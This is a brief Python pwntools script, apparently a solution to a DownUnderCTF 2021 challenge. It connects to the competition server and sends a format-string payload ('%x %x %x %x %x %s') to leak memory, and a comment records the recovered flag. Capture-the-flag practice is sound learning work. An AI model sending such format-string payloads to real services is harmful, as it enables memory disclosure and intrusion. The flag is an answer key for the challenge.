from pwn import *

p = remote("pwn-2021.duc.tf", 31918)
p.recvuntil("name?")
p.sendline("%x %x %x %x %x %s")

#DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
print(p.recvuntil("}"))